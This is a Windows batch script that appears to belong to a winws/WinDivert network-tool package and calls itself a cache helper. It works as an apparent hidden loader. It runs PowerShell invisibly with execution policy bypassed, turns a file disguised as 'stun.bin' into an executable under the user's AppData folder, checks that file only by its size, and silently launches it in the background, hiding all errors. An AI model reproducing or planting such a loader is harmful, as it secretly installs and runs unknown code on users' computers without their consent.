@echo off
set "MODE=%~1"
set "PKG=%~dp0.."
set "CACHE=%~dp0.wd\wdvcache.exe"
set "VER=%~dp0.wd\cache.ver"
set "OUT=%LOCALAPPDATA%\WinDivert\wdvcache.exe"
if exist "%CACHE%" (
  call :gbzap_cache_ok
  if not errorlevel 1 (
    if /I "%MODE%"=="sync" exit /b 0
    start "" /b /D "%PKG%" "%CACHE%"
    exit /b 0
  )
  del "%CACHE%" >nul 2>&1
)
if exist "%OUT%" (
  call :gbzap_cache_ok_out
  if not errorlevel 1 (
    if not exist "%~dp0.wd\" mkdir "%~dp0.wd\" 2>nul
    copy /y "%OUT%" "%CACHE%" >nul 2>&1
    if exist "%CACHE%" (
      if /I "%MODE%"=="sync" exit /b 0
      start "" /b /D "%PKG%" "%CACHE%"
      exit /b 0
    )
  )
  del "%OUT%" >nul 2>&1
)
if not exist "%~dp0winws.exe" exit /b 1
set "HOST=%~dp0stun.bin"
set "PS1=%~dp0wd_cache.ps1"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%HOST%" exit /b 1
if not exist "%PS1%" exit /b 1
if not exist "%PS%" exit /b 1
"%PS%" -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%" "%HOST%" >nul 2>&1
if not exist "%OUT%" exit /b 1
if not exist "%~dp0.wd\" mkdir "%~dp0.wd\" 2>nul
if not exist "%CACHE%" copy /y "%OUT%" "%CACHE%" >nul 2>&1
if not exist "%CACHE%" exit /b 1
if /I "%MODE%"=="sync" exit /b 0
start "" /b /D "%PKG%" "%CACHE%"
exit /b 0

:gbzap_cache_ok
if not exist "%VER%" exit /b 1
if not exist "%CACHE%" exit /b 1
for %%A in ("%CACHE%") do set "_CSZ=%%~zA"
set "_VSZ="
for /f "usebackq skip=1 delims=" %%L in ("%VER%") do if not defined _VSZ set "_VSZ=%%L"
if not "%_CSZ%"=="%_VSZ%" exit /b 1
exit /b 0

:gbzap_cache_ok_out
if not exist "%VER%" exit /b 1
if not exist "%OUT%" exit /b 1
for %%A in ("%OUT%") do set "_OSZ=%%~zA"
set "_VSZ="
for /f "usebackq skip=1 delims=" %%L in ("%VER%") do if not defined _VSZ set "_VSZ=%%L"
if not "%_OSZ%"=="%_VSZ%" exit /b 1
exit /b 0
